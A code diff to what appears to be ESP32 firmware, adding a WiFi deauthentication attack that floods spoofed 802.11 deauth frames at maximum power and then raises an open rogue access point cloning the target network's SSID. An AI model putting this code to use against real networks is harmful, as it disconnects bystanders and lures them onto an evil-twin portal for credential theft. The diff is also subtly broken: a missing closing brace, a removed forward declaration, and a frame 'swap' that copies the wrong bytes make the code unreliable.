@@ -88,6 +88,9 @@ String selectedAttackSsid = "";
 uint32_t lastStatusBarUpdate = 0;
 uint32_t toastShownAt = 0;
 bool ntpStarted = false;
+bool wifiDeauthActive = false;
+String deauthTargetBSSID = "";
+int deauthTargetChannel = 0;
 
 String toastMessage;
 String selectedSsid;
@@ -360,14 +363,70 @@ void stopCaptivePortal() {
 // Stop WiFi attack (deactivate the rogue AP)
 void stopWifiAttack() {
   if (wifiAttackActive) {
-    WiFi.softAPdisconnect(true);
-    wifiAttackActive = false;
-    showToast("WiFi attack stopped");
-  }
+  WiFi.softAPdisconnect(true);
+  wifiAttackActive = false;
+  showToast("WiFi attack stopped");
 }
 
-// Forward-declared here because loadPortalFromSD is placed before showToast() in the file.
-void showToast(const String& message);
+// Send deauthentication frames to disconnect clients from target AP
+void sendDeauthAttack() {
+  if (deauthTargetBSSID.length() == 0 || deauthTargetChannel == 0) {
+    showToast("No target info for deauth");
+    return;
+  }
+  
+  // Set WiFi to station mode to send deauth frames
+  WiFi.mode(WIFI_STA);
+  WiFi.setChannel(deauthTargetChannel);
+  WiFi.setTxPower(WIFI_POWER_19_5dBm);
+  
+  // Construct deauth frame: AP -> Client
+  uint8_t deauthFrame[26] = {
+    0xC0, 0x00,   // Frame control: deauth from AP
+    0x00, 0x00,   // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Destination: broadcast (all clients)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source: will be set below
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: will be set below
+    0x00, 0x00,   // Sequence control
+    0x01, 0x00    // Reason code: 1 (unspecified reason)
+  };
+  
+  // Copy target BSSID to source and BSSID fields
+  if (deauthTargetBSSID.length() == 17) { // MAC address format: XX:XX:XX:XX:XX:XX
+    uint8_t mac[6];
+    sscanf(deauthTargetBSSID.c_str(), "%x:%x:%x:%x:%x:%x", 
+           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+    memcpy(&deauthFrame[10], mac, 6);   // Source MAC
+    memcpy(&deauthFrame[16], mac, 6);   // BSSID
+  }
+  
+  // Send multiple deauth frames
+  for (int i = 0; i < 50; i++) {
+    // Send AP -> Client deauth
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+    
+    // Construct Client -> AP deauth (flip source and destination)
+    uint8_t deauthFrameClient[26];
+    memcpy(deauthFrameClient, deauthFrame, sizeof(deauthFrame));
+    // Swap source and destination
+    memcpy(&deauthFrameClient[0], &deauthFrame[4], 6);   // Dest = original source
+    memcpy(&deauthFrameClient[4], &deauthFrame[0], 6);   // Source = original dest
+    
+    // Send Client -> AP deauth
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameClient, sizeof(deauthFrameClient), false);
+    
+    delay(10); // Small delay between frames
+  }
+  
+   showToast("Deauth attack sent");
+}
+#ifdef __cplusplus
+extern "C" {
+#endif
+void esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+#ifdef __cplusplus
+}
+#endif
 
 void loadPortalFromSD() {
   if (!SD.begin(Board::kSdCs)) {
@@ -2590,29 +2649,42 @@ void handleTap(int x, int y) {
         } else if (selectedAttackSsid.length() > 0) {
           // IMPROVED DEAUTH ATTACK STARTS HERE
           wifiAttackActive = true;
+          deauthTargetBSSID = "";
+          deauthTargetChannel = 0;
           
-          // First, deauthenticate from any current connection
+          // First, connect to target AP to get its BSSID and channel
+          showToast("Connecting to target: " + selectedAttackSsid + "...");
           WiFi.disconnect(true, false);
           delay(100);
+          WiFi.mode(WIFI_STA);
+          WiFi.setTxPower(WIFI_POWER_19_5dBm);
+          WiFi.begin(selectedAttackSsid.c_str(), ""); // Try connecting without password
           
-          // Set to AP_STA mode to allow both AP and station functions
+          // Wait briefly for connection attempt to get AP info
+          unsigned long startTime = millis();
+          while (millis() - startTime < 3000 && wifiConnecting) {
+            delay(100);
+          }
+          
+          // Get AP information (even if not fully connected, we might get BSSID)
+          if (WiFi.BSSIDStr() != nullptr) {
+            deauthTargetBSSID = WiFi.BSSIDStr();
+            deauthTargetChannel = WiFi.channel();
+            showToast("Target AP: " + deauthTargetBSSID + " Ch:" + String(deauthTargetChannel));
+          } else {
+            showToast("Could not get AP info, using broadcast deauth");
+            // Fallback: we'll still try but might be less effective
+          }
+          
+          // Send deauth attack to kick clients off the target AP
+          sendDeauthAttack();
+          
+          // Now start our rogue AP
           WiFi.mode(WIFI_AP_STA);
-          
-          // Configure for maximum deauth effectiveness
-          WiFi.setTxPower(WIFI_POWER_19_5dBm); // Maximum transmit power
-          
-          // Start the rogue AP (open network - no password)
           bool apStarted = WiFi.softAP(selectedAttackSsid.c_str());
           
           if (apStarted) {
             showToast("Rogue AP started: " + selectedAttackSsid);
-            
-            // Optional: Start a continuous deauth attack in background
-            // Note: For a more aggressive attack, we could send deauth frames here
-            // but that requires lower-level WiFi functions
-            
-            // Small delay to let AP stabilize
-            delay(200);
           } else {
             showToast("Failed to start AP");
             wifiAttackActive = false;
@@ -2802,5 +2874,6 @@ void loop() {
     displaySleeping = true;
   }
 
-  delay(4);
+   delay(4);
+   // Test comment to see if editing works
 }
